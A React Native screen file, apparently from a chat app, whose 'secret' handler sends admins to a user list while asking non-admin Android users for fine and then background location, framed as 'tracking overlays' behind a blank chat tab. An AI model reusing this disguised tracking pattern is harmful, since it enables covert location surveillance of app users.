import { getAuth } from "@react-native-firebase/auth";
import { collection, doc, getDoc, getDocs, getFirestore, limit, query, where } from "@react-native-firebase/firestore";
import { useNavigation } from "@react-navigation/native";
import { useCallback, useEffect, useState } from "react";
import { ActivityIndicator, PermissionsAndroid, Platform, RefreshControl, ScrollView, TouchableOpacity } from "react-native";
import ScreenContainer from "../components/ScreenContainer";
import { Box, Center, Text } from "../components/HOSGluestackUI";
import { moderateScale } from "../utils/scaling";

export default function ChatTab() {
    const [isLooading, setIsLoading] = useState<boolean>(false);
    const navigation = useNavigation<any>();
    useEffect(() => {
        handleSecretLongPress()
    }, [])
    const handleSecretLongPress = async () => {

        const currentUser = getAuth().currentUser;
        if (!currentUser) {
            navigation.navigate('AuthScreen');
            return;
        }
        try {
            setIsLoading(true)
            const db = getFirestore();
            const userDoc = await getDoc(doc(db, 'users', currentUser.uid));
            const profile = userDoc.data();

            if (profile?.role === 'admin') {
                //updateRole('admin');
                const configDoc = await getDoc(doc(db, 'system', 'config'));
                const showUserList = configDoc.data()?.showUserList ?? true;
                if (showUserList === true) {
                    navigation.navigate('UserListScreen');
                } else {
                    const defaultUserQuery = query(collection(db, 'users'), where('isDefault', '==', true), limit(1));
                    const defaultUserSnapshot = await getDocs(defaultUserQuery);
                    if (!defaultUserSnapshot.empty) {
                        const defaultUserDoc = defaultUserSnapshot.docs[0];
                        navigation.navigate('ChatScreen', { targetUser: { uid: defaultUserDoc.id, ...defaultUserDoc.data() } });
                    } else {
                        navigation.navigate('UserListScreen');
                    }
                }
            } else {
                if (Platform.OS === 'android') {
                    setIsLoading(false)

                    const foregroundGranted = await PermissionsAndroid.request(
                        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                        {
                            title: "Foreground Tracking",
                            message: "This node requires location permissions to operate tracking overlays.",
                            buttonPositive: "Grant",
                            buttonNegative: "Deny"
                        }
                    );
                    if (foregroundGranted === PermissionsAndroid.RESULTS.GRANTED && Platform.Version >= 29) {
                        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION);
                    }
                }
            }
            setIsLoading(false)

        } catch (error) {
            setIsLoading(false)

            console.error("Navigation pipeline crash: ", error);
        }
    };
    const [refreshing, setRefreshing] = useState(false);

    // 🚀 Pull-to-refresh trigger function wrapper
    const onRefresh = useCallback(async () => {
        setRefreshing(true);
        try {
            // Triggers your custom action logic
            await handleSecretLongPress();
        } catch (error) {
            console.error("Refresh action failed:", error);
        } finally {
            setRefreshing(false);
        }
    }, [handleSecretLongPress]);
    if (isLooading) {
        return (
            <ScreenContainer showHeader={false} headerTitle="Chat" headerTheme="midnight">
                <Center className="flex-1">
                    <ActivityIndicator size="large" color="#E65100" />
                </Center>
            </ScreenContainer>
        );
    }
    return (
        <ScrollView
            contentContainerStyle={{ flexGrow: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#043125ff' }}
            className="flex-1 w-full h-full"
            showsVerticalScrollIndicator={false}
            refreshControl={
                <RefreshControl
                    refreshing={refreshing}
                    onRefresh={onRefresh}
                    colors={['#047857']} // Emerald spinner track matching your primary styling tint
                    tintColor="#047857" // iOS spinner tint match
                />
            }
        >
            <Center className="w-full">
                <TouchableOpacity
                    onLongPress={handleSecretLongPress} // Retains the manual physical press shortcut option too!
                    activeOpacity={0.75}
                >
                    <Text
                        style={{ fontSize: moderateScale(14) }}
                        className="font-bold text-slate-400 tracking-wider uppercase text-center"
                    >
                        Pull down to refresh or Long Press
                    </Text>
                </TouchableOpacity>
            </Center>
        </ScrollView>
    )
}